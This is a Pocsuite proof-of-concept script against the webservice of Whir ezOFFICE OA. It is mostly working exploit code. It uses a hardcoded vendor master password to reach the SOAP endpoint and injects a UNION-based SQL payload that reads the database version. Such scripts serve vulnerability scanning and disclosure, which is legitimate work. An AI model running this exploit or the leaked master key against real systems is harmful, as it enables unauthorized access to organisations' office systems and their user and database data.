#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import httplib

class TestPOC(POCBase):
    vulID = '91445'  # ssvid
    version = '1.0'
    author = ['s0m30ne']
    vulDate = ''
    createDate = '2016-06-03'
    updateDate = '2016-06-03'
    references = ['http://www.seebug.org/vuldb/ssvid-91445']
    name = '万户OA webservice SQL 注入漏洞'
    appPowerLink = 'http://www.whir.net/'
    appName = 'ezOFFICE'
    appVersion = ''
    vulType = 'SQL injection'
    desc = '''
    webservice服务需要一个通信密码，但官方自己留了一个万能密码：auth.key.whir2012 可以进行添加、删除用户等操作 并进行sql注入
    '''
    samples = ['']
    install_requires = ['']
    #请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def soapRequest(self, host, SoapMessage):
        webservice = httplib.HTTP(host)
        webservice.putrequest("POST", "/defaultroot/xfservices/GeneralWeb")
        webservice.putheader("Host", host)
        webservice.putheader("User-Agent", "Apache-HttpClient/4.1.1 (java 1.5)")
        webservice.putheader("Content-Type", "text/xml; charset=\"UTF-8\"")
        webservice.putheader("Content-Length", "%d" % len(SoapMessage))
        webservice.putheader("SOAPAction", "")
        webservice.endheaders()
        webservice.send(SoapMessage)
        webservice.getreply()
        reply = webservice.getfile().read()
        return reply

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        payload = "1 and 1=2 union select 1,2,@@version,4,5,6,7--"
        SoapMessage = """
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gen="http://com.whir.service/GeneralWeb">
   <soapenv:Header/>
   <soapenv:Body>
      <gen:OAManager>
<gen:input>&lt;root&gt;&lt;key&gt;auth.key.whir2012&lt;/key&gt;&lt;cmd&gt;syncUserList&lt;/cmd&gt;&lt;domain&gt;%s&lt;/domain&gt;&lt;/root&gt;</gen:input>
      </gen:OAManager>
   </soapenv:Body>
</soapenv:Envelop>
"""
        SoapMessage = SoapMessage % payload
        url = self.url
        if url.startswith("http://"):
            url = url[7:]
        if url.endswith("/"):
            url = url[:-1]
        reply = self.soapRequest(url, SoapMessage)
        if "正常" in reply:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Postdata'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)